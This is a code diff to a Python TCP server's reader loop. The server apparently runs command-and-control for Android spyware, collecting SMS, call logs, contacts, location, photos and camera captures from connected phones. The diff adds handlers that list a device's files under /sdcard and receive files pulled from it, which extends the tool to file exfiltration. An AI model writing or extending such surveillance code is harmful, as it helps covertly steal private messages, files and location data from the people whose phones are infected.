@@ -13,9 +13,11 @@ from app.tcp.dispatcher import fail_all_pending, resolve_pending
 from app.tcp.handlers import (
     process_call_logs_data,
     process_cams_data,
+    process_files_data,
     process_sms_data,
     process_telemetry_data,
     save_contacts_data,
+    save_downloaded_file_data,
     save_photo_data,
 )
 
@@ -116,6 +118,21 @@ async def reader_loop(client: ClientSession) -> None:
                 res = process_telemetry_data(client, header)
                 resolve_pending("telemetry", {"status": "ok", "data": res}, client_id=client.id)
 
+            elif msg_type == "files":
+                files = header.get("data", [])
+                current_path = header.get("path", "/sdcard")
+                res = process_files_data(client, files, current_path)
+                resolve_pending("files", {"status": "ok", "path": current_path, "data": res}, client_id=client.id)
+
+            elif msg_type == "file_download":
+                try:
+                    data = await recv_frame(client.reader)
+                    file_info = save_downloaded_file_data(client, header, data)
+                    resolve_pending("file_download", {"status": "ok", **file_info}, client_id=client.id)
+                except Exception as e:
+                    log_error(f"file download read failed for {client.id}: {e}")
+                    resolve_pending("file_download", {"status": "failed", "data": None}, client_id=client.id)
+
             elif msg_type == "error":
                 msg = header.get("message", "unknown error")
                 log_warn(f"client {client.id} reported: {msg}")
@@ -134,6 +151,10 @@ async def reader_loop(client: ClientSession) -> None:
                         target_key = "call_logs"
                     elif "telemetry" in msg_lower or "location" in msg_lower:
                         target_key = "telemetry"
+                    elif "download" in msg_lower:
+                        target_key = "file_download"
+                    elif "file" in msg_lower or "directory" in msg_lower:
+                        target_key = "files"
                     elif "cam" in msg_lower or "photo" in msg_lower or "picture" in msg_lower:
                         target_key = "camera_capture"
                         resolve_pending("cams", {"status": "error", "message": msg, "data": []}, client_id=client.id)
